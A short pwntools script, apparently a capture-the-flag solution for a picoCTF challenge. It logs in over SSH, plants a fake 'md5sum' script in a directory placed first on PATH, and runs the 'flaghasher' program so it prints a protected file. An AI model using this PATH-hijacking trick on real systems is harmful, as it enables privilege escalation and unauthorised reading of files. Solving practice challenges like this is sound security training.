from pwn import *

# ------------------------------
# Configuration
# ------------------------------
HOST = "rescued-float.picoctf.net"
USER = "ctf-player"
PASSWORD = "483e80d4"       # optional if using key
PORT = 55901                   # default SSH port
KEY_FILE = None             # optional private key file path
REMOTE_CMD = "flaghasher"       # command to run remotely

# ------------------------------
# Connect via SSH
# ------------------------------
s = ssh(host=HOST, user=USER, password=PASSWORD, port=PORT)

sh = s.shell()

sh.sendline(b"bash")
sh.sendline(b"export PATH=/home/ctf-player:$PATH")
sh.sendline(b"printf '#! /bin/bash\n\ncat $1\n'> md5sum")
sh.sendline(b"chmod 777 md5sum")
sh.sendline(b"flaghasher")

sh.interactive()

sh.close()
s.close()
